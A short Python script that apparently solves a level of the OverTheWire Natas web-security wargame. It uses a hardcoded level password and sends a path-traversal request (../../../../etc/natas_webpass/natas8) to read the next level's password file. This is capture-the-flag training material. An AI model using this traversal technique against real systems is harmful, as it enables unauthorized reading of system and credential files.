import requests
import re
username = "natas7"
password = "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"
#custom_headers = {"Referer":"http://natas5.natas.labs.overthewire.org/"}
url = "http://%s.natas.labs.overthewire.org/" % username

#custom_cookies = {"loggedin":"1"}

session = requests.Session()
response = session.post(url+"index.php?page=../../../../etc/natas_webpass/natas8", auth = (username, password))

content = response.text

#print(content)
print(re.findall('<br>\n(.*)\n\n', content)[0])
